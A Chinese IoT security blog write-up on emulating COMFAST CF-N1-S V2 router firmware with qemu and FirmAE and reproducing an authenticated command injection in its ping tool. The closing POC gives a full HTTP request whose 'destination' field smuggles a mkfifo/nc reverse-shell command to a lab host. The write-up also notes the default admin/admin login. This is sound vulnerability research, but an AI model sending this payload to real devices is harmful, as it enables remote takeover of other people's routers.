# COMFAST CF-N1-S-V2.6.0.1 路由器模拟与漏洞原理
> 常乐
> 来源：https://www.iotsec-zone.com/article/534

## 概述：

- 供应商：COMFAST
- 产品：COMFAST CF-N1-S V2
- 固件版本：V2.6.0.1
- 漏洞类型：已认证命令注入

COMFSAT CF-N1-S V2 Router中发现了一个命令注入漏洞，攻击者可以通过发送恶意HTTP POST数据包来利用改漏洞执行任意命令。

## 前期准备

我们从官网上获取固件，使用`binwalk -Me CF-N1-S-V2.6.0.1.bin` 解压固件
![0.png](https://www.iotsec-zone.com/api/image/v2/20260407/dhmtom68rt6xsxveec.png)
进入到文件系统中，使用`readelf -h busybox`查看固件的架构，发现是MIPS大端。
![1.png](https://www.iotsec-zone.com/api/image/v2/20260407/dhmnxh5zb6m0xozc46.png)

接下来去寻找路由器的网络服务组件

![2.png](https://www.iotsec-zone.com/api/image/v2/20260407/dhmny8mmrbagpwnvbw.png)
固件中未发现传统的独立 Web 服务进程（如 httpd、lighttpd、boa 或 goahead）。我借鉴了**bashis**的漏洞报告，该固件的 Web 管理界面由 /usr/bin/webmgnt 二进制实现，其采用 FastCGI 协议处理请求。因此，单独运行 webmgnt 无法完整模拟 Web 服务环境，还需要额外启动一个支持 FastCGI 的前端 Web 服务器（如 nginx），并通过 fastcgi_pass 将请求转发给 webmgnt（通常监听 TCP 端口或 Unix socket），才能正确还原固件的 Web 交互行为。

幸运的是，我们发现固件里面好像自带nginx
## 用户模拟（qemu-mips-static）
笔者首先使用用户模拟试一试。

![3.png](https://www.iotsec-zone.com/api/image/v2/20260407/dhmnyqq76hpdsorla0.png)

先看boot和nginx的配置文件
```bash
ROOTFS="/home/iotsec-zone/Desktop/comfast/_CF-N1-S-V2.6.0.1.bin.extracted/squashfs-root/"

# 1) 准备 qemu 到 rootfs
sudo cp /usr/bin/qemu-mips-static "$ROOTFS/usr/bin/"

# 2) 挂载运行时目录
sudo mkdir -p "$ROOTFS/proc" "$ROOTFS/sys" "$ROOTFS/dev" "$ROOTFS/var/run" "$ROOTFS/tmp"
sudo mount -t proc proc "$ROOTFS/proc"
sudo mount --rbind /sys "$ROOTFS/sys"
sudo mount --rbind /dev "$ROOTFS/dev"

# 3) 进入 chroot
sudo chroot "$ROOTFS" /bin/sh

# 4) 改 nginx 端口，避免占用宿主 80/443
cp /etc/nginx/nginx.conf /tmp/nginx-test.conf
sed -i 's/listen 80;/listen 8080;/' /tmp/nginx-test.conf
sed -i 's/listen 443 ssl;/listen 8443 ssl;/' /tmp/nginx-test.conf 2>/dev/null || true

# 5) 启动 webmgnt
/usr/bin/qemu-mips-static /usr/bin/webmgnt -d &

# 6) 启动 nginx（前台）
/usr/bin/qemu-mips-static /usr/sbin/nginx -c /tmp/nginx-test.conf -g 'daemon off;'
```

启动webmgnt，让它监听9002。

![4.png](https://www.iotsec-zone.com/api/image/v2/20260407/dhmo0hf3a8zhexctxg.png)

启动前端nginx

![5.png](https://www.iotsec-zone.com/api/image/v2/20260407/dhmo0u3vs6ffawtkiw.png)

登录是能登陆上去，但是还是有很多启动项没有起来，而且除了主界面，其他界面都运行不起来，说明还是有其他功能没有运行。

![6.png](https://www.iotsec-zone.com/api/image/v2/20260407/dhmo14rpo8e9s0gcak.png)

发现三个问题点，一个是switch，设备启动时程序想要交换芯片或交换机控制任务，但当前模拟环境里没有对应硬件、驱动或者控制接口；第二个是`Failed to connect to ubus`,属于**依赖服务缺失** **Tips**:`ubus` 是 OpenWrt 常见的消息总线；第三个是`/tmp/sysinfo/board_name` 和`/tmp/sysinfo/mac` 这两个文件一个是标识设备型号/硬件平台，另一个是设置MAC地址（通常是LAN/WAN/MAC）**Tips**: `sysinfo`目录是运行时系统信息缓存目录，它是设备启动过程中动态生成的临时信息。通常这些文件是在系统启动过程中，由 **init 脚本 + board_detect + 系统服务（ubus / nvram）**共同生成的

![7.png](https://www.iotsec-zone.com/api/image/v2/20260407/dhmo1git9wcuapusnf.png)

当前设备可能的完整生成链路
```bash
内核启动
   ↓
/sbin/init
   ↓
/etc/init.d/rcS
   ↓
执行一堆启动脚本
   ↓
board_detect / system.sh
   ↓
读取硬件信息（flash / nvram / 驱动）
   ↓
写入 /tmp/sysinfo/*
```
所以原因是没有真实的硬件板子，导致sysinfo文件里缺少board_name和mac数据，现在的思路就是去到系统里去寻找有没有可能对这个sysinfo文件输入数据的程序，如果有的话，我们启动这个程序，如果没有的话，我们伪造这个数据。

![8.png](https://www.iotsec-zone.com/api/image/v2/20260407/dhmo24t47ucwdzvhvy.png)

![9.png](https://www.iotsec-zone.com/api/image/v2/20260407/dhmo2bio0o02rec2ka.png)
我们看到有两个文件可能和sysinfo有关`/lib/ar71xx.sh`和`10_sysinfo`我们分别看一下它们的代码。

- `/lib/ar71xx.sh：dd if=$dev bs=1 skip=0 count=6 2>/dev/null | hexdump -v -e '1/1 "%02x:"' | sed '$s/.$//' > /tmp/sysinfo/mac`这表示从某个设备/分区`$dev`读取前6个字节，格式化成MAC地址，写入`/tmp/sysinfo/mac`。

`/lib/ar71xx.sh`就是主要往sysinfo文件里面写入数据的脚本，运行这个脚本试一下。

![10.png](https://www.iotsec-zone.com/api/image/v2/20260407/dhmo2mqidl2mnaulgd.png)
运行失败,开始伪造！
```bash
wifi_info_init() {
	local board=$(ar71xx_board_name)
	local def_txpower_2g
	local def_txpower_5g
	local no_ht80_with_11a
	local wifi_user_led
	local button_wps

	case "$board" in
	ap121)
		def_txpower_2g="25"
		;;

	

	
	cf-wa300 |\
	cf-wa300v2 |\
	cf-wa700 |\
	cf-wr600n |\
	cf-wr605n |\
	cf-n1s |\
	ws-gr402 |\
	ws-gr405 |\
	cf-wr615n)
		def_txpower_2g="25"
		;;

	cf-a4 |\
	cf-e113a |\
	cf-e120a |\
	cf-e120av2 |\
	cf-e120av3 |\
	cf-e211a |\
	cf-e305a |\
	cf-e312a |\
	cf-e315a |\
	cf-e6100)
		def_txpower_5g="21"
		no_ht80_with_11a="1"
		;;

	cf-e317a)
		def_txpower_5g="28"
		no_ht80_with_11a="1"
		;;

	cf-e356a |\
	cf-wa750)
		def_txpower_2g="21"
		def_txpower_5g="21"
		no_ht80_with_11a="1"
		;;

        cf-e4)
		def_txpower_2g="20"
		def_txpower_5g="17"
		no_ht80_with_11a="0"
                ;;

	
	esac

	[ -n "$def_txpower_2g" ] && echo "$def_txpower_2g" > /tmp/sysinfo/txpower
	[ -n "$def_txpower_5g" ] && echo "$def_txpower_5g" > /tmp/sysinfo/txpower_5g
	[ -n "$no_ht80_with_11a" ] && echo "$no_ht80_with_11a" > /tmp/sysinfo/no_ht80_with_11a

	case "$board" in
	cf-wr615n |\
	cf-wr630ac |\
	cf-wr635ac |\
	cf-wr650ac)
		wifi_user_led="1"
		button_wps="1"
	;;

	cf-e3 | \
	cf-e4 | \
	ws-r642-overseas |\
	cf-wr752ac |\
	cf-n1s |\
	ws-gr402 |\
	ws-gr405 |\
	ws-r650)
		button_wps="1"
	;;
	esac

	[ -n "$wifi_user_led" ] && echo "$wifi_user_led" > /tmp/sysinfo/wifi_user_led
	[ -n "$button_wps" ] &&  touch /tmp/sysinfo/button_wps

	# TODO if anyone do not need admin wifi, disable here
	case "$board" in
	cf-rf105)
		echo "do generate any files about wifi"
	;;

	*)
		echo "1" > /tmp/sysinfo/admin_wifi_exist
	;;
	esac
}
```
我们的设备是CF-N1-S，写出对应伪造脚本
```bash
mkdir -p /tmp/sysinfo

echo "cf-n1s" > /tmp/sysinfo/board_name
echo "CF-N1-S" > /tmp/sysinfo/model
echo "00:11:22:33:44:55" > /tmp/sysinfo/mac

echo "25" > /tmp/sysinfo/txpower
touch /tmp/sysinfo/button_wps
echo "1" > /tmp/sysinfo/admin_wifi_exist

echo "00:11:22:33:44:55" > /tmp/sysinfo/wifidog_mac
```

![11.png](https://www.iotsec-zone.com/api/image/v2/20260407/dhmo3o4gzrhfhmi19u.png)
我们发现，之前的`sysinfo`问题以及`Segmentation fault`问题不见了，我们在squashfs-root里面找到ubusd二进制文件，我们模拟运行它。

![12.png](https://www.iotsec-zone.com/api/image/v2/20260407/dhmo3vfgd0c4vezv92.png)

![13.png](https://www.iotsec-zone.com/api/image/v2/20260407/dhmo41ip6q3ch5w8gl.png)

模拟成功！

Access denied的根因是登录后的会话被固件自己删掉，首次登录/引导分支导致的 Access denied。

我们再回看启动项，发现在/etc/rc.local下

![14.png](https://www.iotsec-zone.com/api/image/v2/20260407/dhmo4bbimd79xtypzu.png)
这段配置文件主要作用一是修网络，二是跳过首次引导/协议页，所以它是解决Access denied的主要原因。查找可能的使用rc.local配置文件的文件，/etc/init.d/done脚本就是运行这个文件的，我们只要运行后一部分就可以了。

![15.png](https://www.iotsec-zone.com/api/image/v2/20260407/dhmo4orijukjt9jk6i.png)
## 系统模拟（qemu-system-mips)

我们再用系统模拟玩一下，系统模拟我们需要搭建一个MIPS系统虚拟机，配置内外网卡，将文件系统打包进入到虚拟机内。

配置主机网络：

```bash
sudo tunctl -t tap0  
sudo ifconfig tap0 192.168.0.4/24 up
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null # 配置NAT（假设物理机外网接口是ens33）
sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE
sudo iptables -A FORWARD -i tap0 -j ACCEPT
sudo iptables -A FORWARD -o tap0 -j ACCEPT
```
启动脚本：
```bash
qemu-system-mips \
    -M malta\
    -kernel /home/iotsec-zone/Tools/qemu-images/mips/vmlinux-3.2.0-4-4kc-malta \
    -hda /home/iotsec-zone/Tools/qemu-images/mips/debian_squeeze_mips_standard.qcow2 \
    -append "root=/dev/sda1 console=tty0" \
    -net nic -net tap,ifname=tap0,script=no,downscript=no \
    -nographic
```
虚拟机配置网卡:
```bash
ip link add br0 type dummy
ifconfig eth0 192.168.0.2/24
ifconfig br0 192.168.0.3/24
```
密码root/root

![16.png](https://www.iotsec-zone.com/api/image/v2/20260407/dhmo5zo9gxuxinys3t.png)
我们在`guest`里面`wget`打包好的文件系统。
```bash
tar -cvf s.tar.gz squashfs-root/ #在外面把文件系统压缩成tar.gz文件
python3 -m http.server #起http.server服务
wget 192.168.0.4:8000/s.tar.gz #guest获取压缩文件系统
tar -xvf s.tar.gz #解压文件系统
```

![17.png](https://www.iotsec-zone.com/api/image/v2/20260407/dhmo6d121ubqdwrhik.png)
写一个脚本`start_cf_nis.sh`一键运行`web`服务，在`guest`里面`wget`脚本，一键运行`patch`和`webmgnt`和`nignx`。或者直接脚本写到rc.local里面。

![18.png](https://www.iotsec-zone.com/api/image/v2/20260407/dhmo6r169o6radtrbv.png)
```bash
#在guest里面
  chmod +x start_cf_nis.sh
  ./start_cf_n1s.sh
  ```
运行脚本之后发现依旧出现段错误，而且连ps命令都使用不了了，我们跳到外面去看任务

![19.png](https://www.iotsec-zone.com/api/image/v2/20260407/dhmo7e18739d3bwr4q.png)
杀掉进程重新修改脚本，力求串成一条**稳定的用户态仿真启动链**，
```bash
#!/bin/sh

# 严格模式
# -e  任意命令失败退出
# -u  使用未定义变量报错
set -eu

# 获取脚本自身路径
SELF="$0"

# ROOTFS = 脚本所在目录（要求脚本放在 squashfs-root 目录内）
ROOTFS="$(CDPATH= cd -- "$(dirname -- "$SELF")" && pwd)"

# 检查是否在正确的 rootfs 内运行
# 必须存在 webmgnt 和 nginx 二进制
if [ ! -x "$ROOTFS/usr/bin/webmgnt" ] || [ ! -x "$ROOTFS/usr/sbin/nginx" ]; then
	echo "[!] run this script from the extracted CF-N1-S squashfs-root directory" >&2
	exit 1
fi

#------------------------------------------------------------
# 挂载函数（避免重复挂载）
#------------------------------------------------------------
mount_if_needed() {
	src="$1"
	dst="$2"
	type="$3"

	mkdir -p "$dst"

	# 已经挂载就跳过
	if grep -qs " $dst " /proc/mounts; then
		return 0
	fi

	case "$type" in
		proc)
			# 挂载 proc
			mount -t proc "$src" "$dst" 2>/dev/null || true
			;;
		bind)
			# bind 挂载宿主目录
			mount --bind "$src" "$dst" 2>/dev/null || true
			;;
	esac
}

#------------------------------------------------------------
# 准备 rootfs 运行环境
#------------------------------------------------------------
prepare_rootfs() {

	# 创建运行时目录
	mkdir -p "$ROOTFS/proc" "$ROOTFS/sys" "$ROOTFS/dev" "$ROOTFS/tmp" "$ROOTFS/var/run"

	# 挂载运行时文件系统
	mount_if_needed proc "$ROOTFS/proc" proc
	mount_if_needed /sys "$ROOTFS/sys" bind
	mount_if_needed /dev "$ROOTFS/dev" bind

	# 创建 sysinfo 和 nginx 运行目录
	mkdir -p \
		"$ROOTFS/tmp/sysinfo" \
		"$ROOTFS/tmp/run" \
		"$ROOTFS/var/etc" \
		"$ROOTFS/var/log/nginx"

	#--------------------------------------------------------
	# 伪造设备信息 (避免 webmgnt 崩溃)
	#--------------------------------------------------------
	echo "cf-n1s" > "$ROOTFS/tmp/sysinfo/board_name"
	echo "CF-N1-S" > "$ROOTFS/tmp/sysinfo/model"
	echo "00:11:22:33:44:55" > "$ROOTFS/tmp/sysinfo/mac"

	echo "25" > "$ROOTFS/tmp/sysinfo/txpower"
	echo "1" > "$ROOTFS/tmp/sysinfo/admin_wifi_exist"
	echo "00:11:22:33:44:55" > "$ROOTFS/tmp/sysinfo/wifidog_mac"

	touch "$ROOTFS/tmp/sysinfo/button_wps"

	#--------------------------------------------------------
	# 复制 nginx 配置并修改端口
	#--------------------------------------------------------
	if [ ! -s "$ROOTFS/tmp/nginx-test.conf" ]; then

		# 复制原始配置
		cp "$ROOTFS/etc/nginx/nginx.conf" "$ROOTFS/tmp/nginx-test.conf"

		# 改端口避免冲突
		sed -i 's/listen 80;/listen 8080;/' "$ROOTFS/tmp/nginx-test.conf" 2>/dev/null || true
		sed -i 's/listen 443 ssl;/listen 8443 ssl;/' "$ROOTFS/tmp/nginx-test.conf" 2>/dev/null || true
	fi
}

# 执行 rootfs 准备
prepare_rootfs

echo "[*] entering chroot: $ROOTFS"

#------------------------------------------------------------
# 进入固件 rootfs 执行
#------------------------------------------------------------
chroot "$ROOTFS" /bin/sh <<'EOF'

set -eu

# 创建运行时目录
mkdir -p /tmp/sysinfo /tmp/run /var/run /var/etc /var/log/nginx

#--------------------------------------------------------
# 跳过首次登录向导
#--------------------------------------------------------
uci -q set login.user.agreement='1' || true
uci -q set login.user.guide='1' || true
uci -q set login.user.first_login='0' || true
uci -q commit login || true

#--------------------------------------------------------
# 清理旧进程
#--------------------------------------------------------
killall nginx 2>/dev/null || true
killall webmgnt 2>/dev/null || true
killall ubusd 2>/dev/null || true
sleep 1

#--------------------------------------------------------
# 启动 ubus 总线
#--------------------------------------------------------
echo "[*] starting ubusd"
# ubus 提供 RPC 通信
/sbin/ubusd >/tmp/ubusd.log 2>&1 &
sleep 1

#--------------------------------------------------------
# 启动 webmgnt FastCGI 后端
#--------------------------------------------------------
echo "[*] starting webmgnt FastCGI backend"
/usr/bin/webmgnt -d >/tmp/webmgnt.log 2>&1 &
sleep 2

#--------------------------------------------------------
# 启动 nginx 前端
#--------------------------------------------------------
echo "[*] starting nginx on port 8080"

/usr/sbin/nginx \
	-c /tmp/nginx-test.conf \
	-g 'daemon off;' \
	>/tmp/nginx.log 2>&1 &

sleep 2

#--------------------------------------------------------
# 打印进程状态
#--------------------------------------------------------
echo "[*] process status"
ps | grep -E 'ubusd|webmgnt|nginx' | grep -v grep || true

#--------------------------------------------------------
# 自动测试登录
#--------------------------------------------------------
if [ -x /usr/bin/curl ]; then

	i=0

	while [ "$i" -lt 10 ]; do

		# 调用 login 接口
		SID="$(/usr/bin/curl -si --max-time 5 \
			-H 'Content-Type: application/json' \
			-d '{"username":"admin","password":"admin"}' \
			http://127.0.0.1:8080/cgi-bin/login |
			awk -F'[=;]' '/^Set-Cookie: COMFAST_SESSIONID=/{print $2; exit}')"

		# 成功获取 session
		if [ -n "$SID" ] && [ "$SID" != "DELETED" ]; then
			echo "[*] login session ready: $SID"
			break
		fi

		i=$((i + 1))
		sleep 2
	done
fi

#--------------------------------------------------------
# 输出测试地址
#--------------------------------------------------------
echo "[*] test URL: http://127.0.0.1:8080/login.html"

EOF
```
1.  解决 sysinfo 崩溃`/tmp/sysinfo/*`
2.  避免 ubus 连接失败`/sbin/ubusd`
3.  避免首次登录拦截`uci login.user.*`
4.  修 nginx 端口冲突`80 -> 8080`
5.  自动验证登录是否成功`curl logi`

模拟成功！

![20.png](https://www.iotsec-zone.com/api/image/v2/20260407/dhmo81knl79qiwfpod.png)

## 使用FirmAE生成镜像

前面两种方式虽然都能把 Web 服务拉起来，但是过程比较割裂。用户模拟要自己补 `/tmp/sysinfo`、手动起 `ubusd`、`webmgnt` 和 `nginx`；系统模拟又要自己准备 MIPS 虚拟机、传文件系统、修网络，最后仍然会遇到启动链不完整的问题。

所以这里换一个思路：让 FirmAE 先帮我们完成固件解包、rootfs 镜像制作、网络推断和 QEMU 启动。这样更接近“系统启动”的状态，我们只需要在它推不出来的板级信息上做少量修补。

本地固件路径如下：

```bash
/home/iotsec-zone/Desktop/comfast/CF-N1-S-V2.6.0.1.bin
```

FirmAE 的工作目录如下：

```bash
/home/iotsec-zone/Tools/FirmAE
```

我没有直接手写一长串 `qemu-system-mips` 参数，而是写了一个包装脚本：

```bash
/home/iotsec-zone/Desktop/qemu-system-mips.sh
```

先用 `prepare` 模式让 FirmAE 生成镜像：

```bash
sudo bash /home/iotsec-zone/Desktop/qemu-system-mips.sh prepare ""
```

脚本内部实际会进入 FirmAE 目录，然后调用：

```bash
./run.sh -r auto /home/iotsec-zone/Desktop/comfast/CF-N1-S-V2.6.0.1.bin
```

这一步主要做几件事：

- 解包固件文件系统
- 识别架构，这里识别为 `mipseb`
- 生成 `scratch` 目录下的 `image.raw`
- 调用 FirmAE 的网络推断逻辑
- 用 FirmAE 自带的 MIPS 大端 kernel 启动 QEMU

本次生成出来的镜像 ID 是 `2`，关键文件在这里：

```bash
/home/iotsec-zone/Tools/FirmAE/scratch/2/image.raw
/home/iotsec-zone/Tools/FirmAE/scratch/2/qemu.final.serial.log
```

后续不需要每次都重新解包生成镜像，直接启动这个已经生成好的镜像就行：

```bash
bash /home/iotsec-zone/Desktop/qemu-system-mips.sh direct 2
```

这里用的是 FirmAE/Firmadyne 的通用 MIPS 大端环境：

```bash
qemu-system-mips
-M malta
-kernel /home/iotsec-zone/Tools/FirmAE/binaries/vmlinux.mipseb.4
-drive if=ide,format=raw,file=/home/iotsec-zone/Tools/FirmAE/scratch/2/image.raw
```

需要注意的是，这并不是精确的 CF-N1-S 板级模拟。真实设备是 ar71xx/ath79 这一类板子，而 QEMU 没有直接可用的 CF-N1-S 板级模型，所以这里的思路是用 `malta + mipseb generic kernel` 去跑固件用户态。对 Web 漏洞复现来说，这个精度已经够用；如果研究无线、交换芯片或者硬件寄存器，就不能把它当成真实板子。

脚本默认做了宿主机端口转发：

```bash
8080 -> 80
8443 -> 443
2222 -> 22
```

因为这里默认走的是 QEMU user networking，guest 侧最好有一个稳定的 `10.0.2.15` 地址，否则宿主机的端口转发可能表现为端口能连上，但是 HTTP 请求一直挂住。所以 `/etc/rc.local` 里也补了一段网络兜底：

```sh
if ! ifconfig eth0 2>/dev/null | grep -q 'inet addr:'; then
	ifconfig eth0 10.0.2.15 netmask 255.255.255.0 up 2>/dev/null || true
	route add default gw 10.0.2.2 eth0 2>/dev/null || true
fi
```

启动之后，宿主机可以先访问登录页：

```bash
curl --noproxy '*' -v -H 'Host: cflogin.cn' http://127.0.0.1:8080/login.html
```

这一步如果能返回登录页面，说明 `nginx` 至少已经起来了。接下来还要继续验证 `nginx -> webmgnt` 这条 FastCGI 链路，因为静态页面能打开不代表 CGI 一定正常。

## 使用脚本补齐后稳定状态

一开始我以为 FirmAE 会自动补齐所有运行状态，但实际跑起来后发现还是有几个固件自己的假设没有满足。

第一个问题还是板级信息。CF-N1-S 的很多启动脚本会从 `/tmp/sysinfo/board_name`、`/tmp/sysinfo/model`、`/tmp/sysinfo/mac` 里读状态，`/lib/ar71xx.sh` 又会尝试从 `art`、`configs` 这类 MTD 分区里读 MAC、硬件版本和板型。FirmAE 的 malta 环境没有真实的 `art` 分区，所以这部分不能完全依赖自动生成。

这里的处理思路和前面用户模拟一样：不要强行模拟不存在的硬件，而是给 Web 启动链补一份最小可用状态。核心状态如下：

```sh
mkdir -p /tmp/sysinfo
echo "cf-n1s" > /tmp/sysinfo/board_name
echo "CF-N1-S" > /tmp/sysinfo/model
echo "00:11:22:33:44:55" > /tmp/sysinfo/mac
echo "25" > /tmp/sysinfo/txpower
touch /tmp/sysinfo/button_wps
echo "1" > /tmp/sysinfo/admin_wifi_exist
echo "00:11:22:33:44:55" > /tmp/sysinfo/wifidog_mac
```

第二个问题是 `81_load_ath10k_board_bin`。这个脚本会从 `art` 分区里切 ath10k 的 board data：

```sh
dev=$(find_mtd_part "art")
dd if=$dev bs=4 skip=5120 count=529 of=/tmp/ath10k-board1.bin
```

真实设备上这没有问题，但 FirmAE 里没有对应分区时，继续 `dd` 只会制造无意义的错误。因此这里做了最小化处理：没有 `art` 时直接返回，不让无线校准数据影响 Web 服务启动。

第三个问题是登录流程。之前看到 `Access denied` 的时候，表面上像是认证失败，但抓响应头以后发现根因不是密码错，而是登录后固件马上把会话删掉了：

```http
Set-Cookie: COMFAST_SESSIONID=DELETED
```

继续回头看配置后发现，Web 管理程序会根据首次配置状态走不同分支。如果还处于首次引导/协议确认流程，登录虽然返回 200，但是后续接口会被拦掉。所以需要把登录状态固定成已经完成初始化：

```sh
uci -q set login.user.agreement='1'
uci -q set login.user.guide='1'
uci -q set login.user.first_login='0'
uci -q commit login
/etc/init.d/webcfg restart >/dev/null 2>&1 || true
```

这几行已经放进了 `/etc/rc.local`，作用就是每次 FirmAE guest 启动后自动把 Web 登录流程拉回到可测试状态。

同时，由于 QEMU user networking 默认希望 guest 侧使用 `10.0.2.15`，如果固件网络脚本没有给 `eth0` 配地址，宿主机端口转发可能表现为端口能连上但 HTTP 请求挂住。因此 `/etc/rc.local` 里也补了网络兜底：

```bash
if ! ifconfig eth0 2>/dev/null | grep -q 'inet addr:'; then
	ifconfig eth0 10.0.2.15 netmask 255.255.255.0 up 2>/dev/null || true
	route add default gw 10.0.2.2 eth0 2>/dev/null || true
fi
```

### 使用 nc 连接 FirmAE 串口

FirmAE 启动后会创建 QEMU 串口 Unix socket：

```bash
/tmp/qemu.2.S1
```

可以直接使用 `nc` 进入 guest：

```bash
nc -U /tmp/qemu.2.S1
```

连接后敲一次回车，能看到 BusyBox shell：

```text
/ #
```

本次实际连接后检查到：

```text
/ # pwd; uname -a
/
Linux COMFAST 4.1.17+ #17 Sat Oct 31 17:56:16 KST 2020 mips GNU/Linux
```

网卡状态也已经符合 QEMU user networking 的预期：

```text
eth0      Link encap:Ethernet  HWaddr 52:54:00:12:34:56
          inet addr:10.0.2.15  Bcast:10.0.2.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
```

这一步很关键，因为 guest 内部直接访问 `127.0.0.1` 比宿主机 `8080` 端口转发更稳定。

### web自检

为了后面复现方便，我又补了两个脚本。第一个是宿主机侧的一键启动加自检：

```bash
bash /home/iotsec-zone/Desktop/squashfs-root/run_firmae_and_selftest.sh
```

它会检查 FirmAE guest 是否已经运行，如果没运行就启动：

```bash
bash /home/iotsec-zone/Desktop/qemu-system-mips.sh direct 2
```

然后通过 QEMU 串口进入 guest，执行 guest 内部的 Web 自检脚本：

```sh
/usr/bin/guest_web_selftest.sh
```

第二个是宿主机直接通过端口转发测 Web：

```bash
bash /home/iotsec-zone/Desktop/squashfs-root/repro_firmae_web.sh
```

这个脚本会访问宿主机的 `127.0.0.1:8080`，先登录拿 Cookie：

```http
POST /cgi-bin/login
Content-Type: application/json

{"username":"admin","password":"admin"}
```

登录成功后应该能拿到真实的会话：

```http
Set-Cookie: COMFAST_SESSIONID=<real-session>; Path=/; Version=1
```

然后再带着 Cookie 请求受保护接口：

```http
POST /cgi-bin/system-status?method=GET&section=first_login
Cookie: COMFAST_SESSIONID=<real-session>
Content-Type: application/json

{}
```

这里有一个坑：不要用普通 `GET` 去测 `/cgi-bin/system-status`。前端真实请求方式是 `POST + method=GET`，如果直接用浏览器 GET，可能会看到 502 或者空 FastCGI 返回，但这不代表 Web 链路没起来。

最终我用下面两个接口判断模拟是否成功：

```bash
POST /cgi-bin/system-status?method=GET&section=first_login
POST /cgi-bin/system-status?method=GET&section=language
```

返回里能看到：

```json
{"errCode":0}
```

就说明当前 FirmAE 环境下 `nginx`、`webmgnt`、`ubusd` 和登录会话这几部分已经能配合工作了。到这里，FirmAE 模拟不只是“页面能打开”，而是已经进入了可以继续做漏洞复现的状态。

如果宿主机侧 `8080` 偶尔超时，不一定是固件服务没起来。FirmAE 的端口转发有时会抖动，优先进 guest 里面跑：

```sh
/usr/bin/guest_web_selftest.sh
```

guest 内部直接请求 `127.0.0.1`，不经过宿主机端口转发，是目前最稳定的验证方式。

![21.png](https://www.iotsec-zone.com/api/image/v2/20260407/dhmo8nwaxve5t3gp83.png)

## 漏洞复现

### 概述

COMFSAT CF-N1-S V2 Router中发现了一个命令注入漏洞，攻击者可以通过发送恶意HTTP POST数据包来利用改漏洞执行任意命令。当请求路径为`POST /cgi-bin/mbox-config?method=SET&section=ping_config HTTP/1.1`时，该漏洞可以被触发，要求用户登录获取到cookie。

### 漏洞详情

漏洞点位于webmgnt组件的`sub_442E34`方法，此处对于`destination`也就是`off_469500`字段没有进行校验就使用了`sprintf`进行拼接，并且与system函数使用了同一个参数v10，导致命令执行。

![22.png](https://www.iotsec-zone.com/api/image/v2/20260407/dhmo920josphqtjtmt.png)

其中`off_47D1FC`函数代表的是`sprinf`

![23.png](https://www.iotsec-zone.com/api/image/v2/20260407/dhmo9bbhg8nw6xnuks.png)

`aBinPing4C4W2ST`代表的是`/bin/ping -4 -c 4 -W 2 \"%s\" > /tmp/pinglog 2>/tmp/pinglog`

![24.png](https://www.iotsec-zone.com/api/image/v2/20260407/dhmo9plmv4d48xbuxs.png)

`off_47D394`函数代表的是`system`函数

![25.png](https://www.iotsec-zone.com/api/image/v2/20260407/dhmoa6n90zo9htpps5.png)

### POC

```html
POST /cgi-bin/mbox-config?method=SET&section=ping_config HTTP/1.1
Host: 127.0.0.1:8080
Content-Length: 114
sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: appliation/json
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
sec-ch-ua-platform: "Linux"
Origin: http://127.0.0.1:8080
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8080/tools/tools_ping.html
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: COMFAST_SESSIONID=0a000202-52550a000202-327b23c6
Connection: close

{"destination": "127.0.0.1\";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.4 9999 >/tmp/f; #"}
```

![26.png](https://www.iotsec-zone.com/api/image/v2/20260407/dhmoaslk8itgfdm7xv.png)

漏洞这里借鉴了红队大佬bashis的poc，特此感谢！

感谢Sebao老师的指导与帮助！
